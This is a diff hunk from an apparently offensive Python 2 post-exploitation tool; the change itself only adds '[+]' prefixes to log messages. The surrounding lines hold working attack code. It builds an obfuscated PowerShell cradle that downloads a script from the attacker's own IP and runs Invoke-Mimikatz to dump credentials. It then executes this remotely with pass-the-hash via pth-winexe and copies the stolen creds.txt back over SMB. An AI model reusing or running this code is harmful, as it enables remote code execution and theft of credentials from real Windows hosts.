@@ -541,9 +541,9 @@ def datadump(user, passw, host, path, os_version):
 					else:
 						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"Invoke-Mimikatz"+randint(1,50)*x+" -DumpCreds > c:\\creds.txt"
 					
-					print colored("Using: "+line,'yellow')
+					print colored("[+] Using: "+line,'yellow')
 					en = b64encode(line.encode('UTF-16LE'))
-					print colored("Encoding command: "+en,'yellow')
+					print colored("[+] Encoding command: "+en,'yellow')
 					
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get creds.txt\' 2>/dev/null")
